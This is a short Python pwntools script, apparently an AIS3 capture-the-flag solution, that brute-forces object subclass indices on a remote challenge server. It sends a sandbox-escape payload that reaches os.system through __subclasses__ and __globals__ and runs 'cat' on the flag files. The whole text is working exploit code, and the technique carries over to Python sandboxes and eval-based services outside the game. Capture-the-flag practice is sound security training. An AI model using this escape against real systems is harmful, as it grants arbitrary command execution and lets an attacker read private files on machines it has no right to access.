from pwn import *

r = remote("chals1.ais3.org", 48763)

# Note: 138 can success
for id in range(0, 200):
    payload = f"[1,2][1:2:().__class__.__base__.__subclasses__()[{id}].__init__.__globals__['system']('cat /home/ctf/*FLAG*')]"

    r.sendlineafter(">>> ", payload.encode())
    res = r.recvline()
    print("Current id", id)
    print(res)
    res = r.recvline()
    print(res)
    res = r.recvline()
    print(res)

